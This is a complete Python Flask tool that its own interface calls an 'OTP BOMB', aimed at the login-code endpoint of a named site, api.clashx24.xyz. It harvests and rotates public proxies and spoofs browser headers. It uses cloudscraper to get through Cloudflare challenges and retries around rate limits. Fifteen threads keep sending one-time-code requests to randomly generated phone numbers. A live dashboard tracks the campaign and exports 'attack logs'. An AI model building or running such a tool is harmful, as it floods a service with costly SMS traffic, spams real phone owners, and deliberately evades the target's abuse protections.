import os
import time
import random
import json
import threading
import requests
import cloudscraper
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, jsonify, render_template_string, Response

app = Flask(__name__)

# --- GLOBAL STATE ---
STATE = {
    "start_time": time.time(),
    "start_time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "code_200": 0,
    "code_201": 0,
    "code_400": 0,
    "code_403": 0,
    "code_429": 0,
    "code_other": 0,
    "proxies_fetched": 0,
    "proxies_dead": 0,
    "proxies_live": 0,
    "total_attempts": 0,
    "logs": []
}

PROXIES_LIVE_QUEUE = []
PROXY_SCORES = {}
BG_THREADS_STARTED = False
LOG_LOCK = threading.Lock()

# --- LOGGING SYSTEM ---
def log_sys(msg, level="info", target="N/A", proxy="N/A"):
    """Thread-safe logging system that pushes data to the UI."""
    with LOG_LOCK:
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "message": msg,
            "level": level,
            "target": target,
            "proxy": proxy
        }
        STATE["logs"].insert(0, entry)
        if len(STATE["logs"]) > 2000:
            STATE["logs"] = STATE["logs"][:2000]

# --- PROXY SCORING SYSTEM ---
def update_proxy_score(proxy, success):
    """Track proxy performance and remove poor performers."""
    if proxy not in PROXY_SCORES:
        PROXY_SCORES[proxy] = {"success": 0, "fail": 0, "last_used": time.time()}
    
    if success:
        PROXY_SCORES[proxy]["success"] += 1
    else:
        PROXY_SCORES[proxy]["fail"] += 1
    
    PROXY_SCORES[proxy]["last_used"] = time.time()
    
    # Calculate success rate
    total = PROXY_SCORES[proxy]["success"] + PROXY_SCORES[proxy]["fail"]
    if total > 5:
        rate = PROXY_SCORES[proxy]["success"] / total
        if rate < 0.15:  # Less than 15% success rate
            if proxy in PROXIES_LIVE_QUEUE:
                PROXIES_LIVE_QUEUE.remove(proxy)
                log_sys(f"SYSTEM: Removed poor performing proxy {proxy} (success rate: {rate:.1%})", "warn", proxy=proxy)

# --- MULTIPLE PROXY FETCHERS ---
def fetch_raw_proxies():
    """Fetches free proxies from multiple sources with better quality."""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
    ]
    
    raw_proxies = set()
    log_sys("SYSTEM: Fetching proxies from 6 global sources...", "info")
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                lines = resp.text.strip().split('\n')
                for line in lines:
                    proxy = line.strip()
                    if ":" in proxy and not proxy.startswith("#"):
                        raw_proxies.add(proxy)
        except Exception as e:
            log_sys(f"SYSTEM: Failed to fetch from {url[:50]}... - {str(e)}", "warn")

    proxy_list = list(raw_proxies)
    random.shuffle(proxy_list)
    
    # Prioritize common working ports
    priority_ports = [80, 84, 443, 8080, 8081, 8082, 3128, 8888, 999, 8085, 8090]
    prioritized = []
    others = []
    
    for proxy in proxy_list:
        port = proxy.split(':')[-1]
        if port.isdigit() and int(port) in priority_ports:
            prioritized.append(proxy)
        else:
            others.append(proxy)
    
    # Take 300 prioritized + 200 others
    final_list = prioritized[:300] + others[:200]
    random.shuffle(final_list)
    
    log_sys(f"SYSTEM: Collected {len(final_list)} proxies (prioritized ports)", "info")
    return final_list

def check_single_proxy(proxy):
    """Validate proxy with better reliability check."""
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        # Test with httpbin which is more reliable
        res = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=5)
        if res.status_code == 200:
            try:
                data = res.json()
                if "origin" in data:
                    PROXIES_LIVE_QUEUE.append(proxy)
                    STATE["proxies_live"] += 1
                    log_sys(f"VALIDATED: Proxy is ALIVE.", "success", proxy=proxy)
                    return
            except:
                pass
    except:
        pass
    
    STATE["proxies_dead"] += 1

def validate_proxy_against_target(proxy):
    """Test proxy against actual target API to ensure it works."""
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        test_payload = {"phone_number": "9999999999"}
        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        res = requests.post(
            "https://api.clashx24.xyz/user/login-code",
            json=test_payload,
            headers=headers,
            proxies=proxy_dict,
            timeout=10
        )
        # If we get 201, it's perfect; 400 means API works but number invalid; 403 means blocked
        if res.status_code in [201, 400]:
            return True
        elif res.status_code == 403:
            return False
        else:
            return True
    except:
        return False

def proxy_manager_thread():
    """Background thread that ensures the live proxy queue never runs dry."""
    while True:
        if len(PROXIES_LIVE_QUEUE) < 30:  # Increased threshold
            log_sys(f"SYSTEM: Live proxy queue low ({len(PROXIES_LIVE_QUEUE)}). Fetching new proxies...", "info")
            new_proxies = fetch_raw_proxies()
            STATE["proxies_fetched"] += len(new_proxies)
            
            log_sys(f"SYSTEM: Downloaded {len(new_proxies)} raw proxies. Validating...", "info")
            
            # First, do basic validation (fast)
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(check_single_proxy, new_proxies)
            
            # Then test the validated ones against the target API
            validated_proxies = PROXIES_LIVE_QUEUE.copy()
            PROXIES_LIVE_QUEUE.clear()  # Reset queue
            
            log_sys(f"SYSTEM: Testing {len(validated_proxies)} proxies against target API...", "info")
            
            working_proxies = []
            with ThreadPoolExecutor(max_workers=30) as executor:
                results = list(executor.map(validate_proxy_against_target, validated_proxies))
                for i, proxy in enumerate(validated_proxies):
                    if results[i]:
                        working_proxies.append(proxy)
                        STATE["proxies_live"] += 1
            
            # Re-add working proxies to queue
            PROXIES_LIVE_QUEUE.extend(working_proxies)
            
            log_sys(f"SYSTEM: Verification complete. {len(working_proxies)} working proxies added.", "success")
        
        time.sleep(10)  # Check every 10 seconds

# --- OTP WORKER LOGIC (Enhanced) ---
def otp_worker_thread(worker_id):
    """Worker thread with smart retry and proxy scoring."""
    while True:
        if not PROXIES_LIVE_QUEUE:
            time.sleep(2)
            continue
            
        # Grab a live proxy
        current_proxy = PROXIES_LIVE_QUEUE.pop(0)
        STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
        log_sys(f"[THREAD-{worker_id}] Acquired proxy: {current_proxy}", "info", proxy=current_proxy)
        
        proxy_dict = {
            "http": f"http://{current_proxy}",
            "https": f"http://{current_proxy}"
        }

        # Create cloudscraper instance
        try:
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False,
                    'desktop': True
                },
                delay=15,
                interpreter='native'
            )
        except Exception as e:
            log_sys(f"[THREAD-{worker_id}] Cloudscraper init failed: {str(e)[:50]}. Using requests.", "warn", proxy=current_proxy)
            scraper = requests.Session()

        # Retry mechanism
        retry_count = 0
        max_retries = 3
        
        while retry_count < max_retries:
            # Generate 10-digit phone number
            phone = random.choice("6789") + "".join(random.choices("0123456789", k=9))
            
            send_otp_url = "https://api.clashx24.xyz/user/login-code"
            
            # Enhanced headers
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ]),
                "accept-language": "en-US,en;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "origin": "https://clashx24.xyz",
                "referer": "https://clashx24.xyz/",
                "cache-control": "no-cache",
                "pragma": "no-cache"
            }
            
            send_payload = {"phone_number": phone}

            STATE["total_attempts"] += 1
            log_sys(f"[THREAD-{worker_id}] Sending OTP to: {phone} (Attempt {retry_count+1}/{max_retries})", "info", target=phone, proxy=current_proxy)

            try:
                send_res = scraper.post(
                    send_otp_url, 
                    json=send_payload, 
                    headers=headers, 
                    proxies=proxy_dict, 
                    timeout=15
                )
                
                # Handle response
                if send_res.status_code == 200 or send_res.status_code == 201:
                    if send_res.status_code == 200:
                        STATE["code_200"] += 1
                    else:
                        STATE["code_201"] += 1
                    
                    update_proxy_score(current_proxy, True)  # Mark as successful
                    
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)[:200]}...", "info", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] ✅ OTP SENT! Status: {send_res.status_code}", "success", target=phone, proxy=current_proxy)
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}...", "info", target=phone, proxy=current_proxy)
                    
                    # Success! Keep using this proxy
                    time.sleep(random.uniform(1.0, 2.5))  # Increased delay
                    retry_count = 0  # Reset retry count on success
                    continue
                    
                elif send_res.status_code == 400:
                    STATE["code_400"] += 1
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] ❌ STATUS 400: Bad request. Burning proxy.", "error", target=phone, proxy=current_proxy)
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "error", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "error", target=phone, proxy=current_proxy)
                    break  # Burn this proxy
                    
                elif send_res.status_code == 403:
                    STATE["code_403"] += 1
                    update_proxy_score(current_proxy, False)
                    retry_count += 1
                    if retry_count < max_retries:
                        log_sys(f"[THREAD-{worker_id}] 🛡️ 403: Cloudflare block. Retry {retry_count}/{max_retries}", "warn", target=phone, proxy=current_proxy)
                        time.sleep(2)  # Wait before retry
                        continue
                    else:
                        log_sys(f"[THREAD-{worker_id}] 🛡️ 403: Max retries reached. Burning proxy.", "error", target=phone, proxy=current_proxy)
                        break
                        
                elif send_res.status_code == 429:
                    STATE["code_429"] += 1
                    update_proxy_score(current_proxy, False)
                    retry_count += 1
                    if retry_count < max_retries:
                        log_sys(f"[THREAD-{worker_id}] 🚦 429: Rate limited. Waiting 30s...", "warn", target=phone, proxy=current_proxy)
                        time.sleep(30)  # Wait for rate limit to reset
                        continue
                    else:
                        log_sys(f"[THREAD-{worker_id}] 🚦 429: Max retries reached. Burning proxy.", "error", target=phone, proxy=current_proxy)
                        break
                    
                else:
                    STATE["code_other"] += 1
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] ⚠️ UNKNOWN STATUS {send_res.status_code}. Burning.", "warn", target=phone, proxy=current_proxy)
                    try:
                        response_json = send_res.json()
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {json.dumps(response_json, indent=4)}", "warn", target=phone, proxy=current_proxy)
                    except ValueError:
                        log_sys(f"[THREAD-{worker_id}] 📄 Response: {send_res.text[:200]}", "warn", target=phone, proxy=current_proxy)
                    break

            except cloudscraper.exceptions.CloudflareChallengeError:
                retry_count += 1
                if retry_count < max_retries:
                    log_sys(f"[THREAD-{worker_id}] 🛡️ Cloudflare challenge failed. Retry {retry_count}/{max_retries}", "warn", target=phone, proxy=current_proxy)
                    time.sleep(3)
                    continue
                else:
                    STATE["code_403"] += 1
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] 🛡️ Cloudflare block. Burning.", "error", target=phone, proxy=current_proxy)
                    break
                    
            except requests.exceptions.Timeout:
                retry_count += 1
                if retry_count < max_retries:
                    log_sys(f"[THREAD-{worker_id}] ⏱️ Timeout. Retry {retry_count}/{max_retries}", "warn", target=phone, proxy=current_proxy)
                    time.sleep(2)
                    continue
                else:
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] ⏱️ Timeout max retries. Burning.", "error", target=phone, proxy=current_proxy)
                    break
                
            except requests.exceptions.ConnectionError:
                retry_count += 1
                if retry_count < max_retries:
                    log_sys(f"[THREAD-{worker_id}] 🔌 Connection error. Retry {retry_count}/{max_retries}", "warn", target=phone, proxy=current_proxy)
                    time.sleep(2)
                    continue
                else:
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] 🔌 Connection error. Burning.", "error", target=phone, proxy=current_proxy)
                    break
                
            except Exception as e:
                retry_count += 1
                if retry_count < max_retries:
                    log_sys(f"[THREAD-{worker_id}] ⚠️ Error: {str(e)[:50]}. Retry {retry_count}/{max_retries}", "warn", target=phone, proxy=current_proxy)
                    time.sleep(2)
                    continue
                else:
                    update_proxy_score(current_proxy, False)
                    log_sys(f"[THREAD-{worker_id}] 💥 Error: {str(e)[:100]}. Burning.", "error", target=phone, proxy=current_proxy)
                    break

        # Proxy is burned, break inner loop and get new proxy
        log_sys(f"[THREAD-{worker_id}] Proxy burned. Getting new one.", "info", proxy=current_proxy)

# --- FLASK SERVER & BOOTSTRAP ---
def init_background_threads():
    global BG_THREADS_STARTED
    if not BG_THREADS_STARTED:
        log_sys("SYSTEM: Initializing background routing threads...", "info")
        
        # Start Proxy Manager
        threading.Thread(target=proxy_manager_thread, daemon=True).start()
        
        # Start 15 Simultaneous OTP Workers (increased from 10)
        for i in range(1, 16):
            threading.Thread(target=otp_worker_thread, args=(i,), daemon=True).start()
            
        BG_THREADS_STARTED = True

@app.before_request
def activate_threads():
    init_background_threads()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    uptime_seconds = int(time.time() - STATE["start_time"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
        "started_at": STATE["start_time_str"],
        "code_200": STATE["code_200"],
        "code_201": STATE["code_201"],
        "code_400": STATE["code_400"],
        "code_403": STATE["code_403"],
        "code_429": STATE["code_429"],
        "code_other": STATE["code_other"],
        "total_attempts": STATE["total_attempts"],
        "proxies_fetched": STATE["proxies_fetched"],
        "proxies_dead": STATE["proxies_dead"],
        "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
        "logs": STATE["logs"][:80],
        "proxy_scores": {k: v for k, v in list(PROXY_SCORES.items())[:10]}
    })

@app.route('/api/export')
def export_data():
    def generate():
        yield json.dumps({
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {
                "total_200": STATE["code_200"],
                "total_201": STATE["code_201"],
                "total_400": STATE["code_400"],
                "total_403": STATE["code_403"],
                "total_429": STATE["code_429"],
                "total_other": STATE["code_other"],
                "total_attempts": STATE["total_attempts"],
                "proxies_fetched": STATE["proxies_fetched"],
                "proxies_dead": STATE["proxies_dead"],
                "proxies_live_queue": len(PROXIES_LIVE_QUEUE)
            },
            "activity_logs": STATE["logs"],
            "proxy_scores": PROXY_SCORES
        }, indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=clashx24_attack_logs.json'})

# --- UI TEMPLATE (Updated with 429 tracking) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // CLASHX24-OTP BOMB v3.0</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            letter-spacing: 2px;
        }
        .header-info {
            text-align: center;
            margin-bottom: 20px;
            color: #00ffff;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 12px;
            text-align: center;
            background: rgba(0, 255, 0, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            margin-top: 8px;
            text-shadow: 0 0 5px #00ff00;
        }
        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); }
        .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
        .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }
        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); }
        .box-gray .stat-value { text-shadow: 0 0 5px #888; }
        .box-gold { border-color: #ffd700; color: #ffd700; box-shadow: 0 0 10px rgba(255, 215, 0, 0.2); }
        .box-gold .stat-value { text-shadow: 0 0 5px #ffd700; }
        .box-green { border-color: #00ff00; color: #00ff00; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
        .box-green .stat-value { text-shadow: 0 0 5px #00ff00; }
        .box-purple { border-color: #9b59b6; color: #9b59b6; box-shadow: 0 0 10px rgba(155, 89, 182, 0.2); }
        .box-purple .stat-value { text-shadow: 0 0 5px #9b59b6; }
        .box-orange { border-color: #ff8c00; color: #ff8c00; box-shadow: 0 0 10px rgba(255, 140, 0, 0.2); }
        .box-orange .stat-value { text-shadow: 0 0 5px #ff8c00; }

        .terminal-container {
            margin-top: 20px;
            background: #000;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
            padding: 15px;
            height: 500px;
            overflow-y: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 6px;
            text-align: left;
            border-bottom: 1px solid #003300;
            font-size: 12px;
        }
        th {
            background: #002200;
            position: sticky;
            top: 0;
            color: #fff;
        }
        .level-system { color: #00ffff; }
        .level-success { color: #00ff00; }
        .level-error { color: #ff3333; }
        .level-warn { color: #ffcc00; }
        .level-info { color: #aaaaaa; }
        
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
            box-sizing: border-box;
            margin-top: 20px;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
        
        .blink {
            animation: blink 1s step-end infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .clashx24-badge {
            color: #ffd700;
            border: 1px solid #ffd700;
            padding: 2px 10px;
            border-radius: 3px;
            font-size: 12px;
            display: inline-block;
            margin-left: 10px;
        }
    </style>
</head>
<body>

    <h1>[ SYS.TERMINAL // CLASHX24-OTP ROUTER ] <span class="clashx24-badge">v3.0</span></h1>
    <div class="header-info">
        <span class="blink">▶</span> SERVER STARTED: <span id="val_started">--</span> | UPTIME: <span id="val_uptime">--</span> | ATTEMPTS: <span id="val_attempts">0</span>
    </div>

    <div class="stats-grid">
        <div class="stat-box box-cyan">
            <div>PROXIES FETCHED</div>
            <div class="stat-value" id="val_fetched">0</div>
        </div>
        <div class="stat-box box-green">
            <div>PROXIES LIVE</div>
            <div class="stat-value" id="val_live">0</div>
        </div>
        <div class="stat-box box-gray">
            <div>PROXIES DEAD</div>
            <div class="stat-value" id="val_dead">0</div>
        </div>
        <div class="stat-box box-gold">
            <div>STATUS 200</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box box-gold">
            <div>STATUS 201</div>
            <div class="stat-value" id="val_201">0</div>
        </div>
        <div class="stat-box box-red">
            <div>STATUS 400</div>
            <div class="stat-value" id="val_400">0</div>
        </div>
        <div class="stat-box box-purple">
            <div>STATUS 403</div>
            <div class="stat-value" id="val_403">0</div>
        </div>
        <div class="stat-box box-orange">
            <div>STATUS 429</div>
            <div class="stat-value" id="val_429">0</div>
        </div>
        <div class="stat-box">
            <div>OTHER STATUS</div>
            <div class="stat-value" id="val_other">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>

    <div class="terminal-container">
        <table>
            <thead>
                <tr>
                    <th width="10%">TIME</th>
                    <th width="45%">EVENT LOG</th>
                    <th width="20%">TARGET (PHONE)</th>
                    <th width="25%">PROXY</th>
                </tr>
            </thead>
            <tbody id="log_body">
                <tr><td colspan="4">Initializing system... Please refresh the page if logs do not appear.</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_started').innerText = data.started_at;
                    document.getElementById('val_attempts').innerText = data.total_attempts;
                    document.getElementById('val_fetched').innerText = data.proxies_fetched;
                    document.getElementById('val_live').innerText = data.proxies_live_queue;
                    document.getElementById('val_dead').innerText = data.proxies_dead;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_201').innerText = data.code_201;
                    document.getElementById('val_400').innerText = data.code_400;
                    document.getElementById('val_403').innerText = data.code_403;
                    document.getElementById('val_429').innerText = data.code_429 || 0;
                    document.getElementById('val_other').innerText = data.code_other;

                    const tbody = document.getElementById('log_body');
                    tbody.innerHTML = ''; 
                    
                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.className = `level-${log.level}`;
                        tr.innerHTML = `
                            <td>${log.time}</td>
                            <td>${log.message}</td>
                            <td>${log.target}</td>
                            <td>${log.proxy}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        setInterval(fetchStats, 1500);
        setTimeout(fetchStats, 500);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    init_background_threads()
    app.run(host='0.0.0.0', port=port)
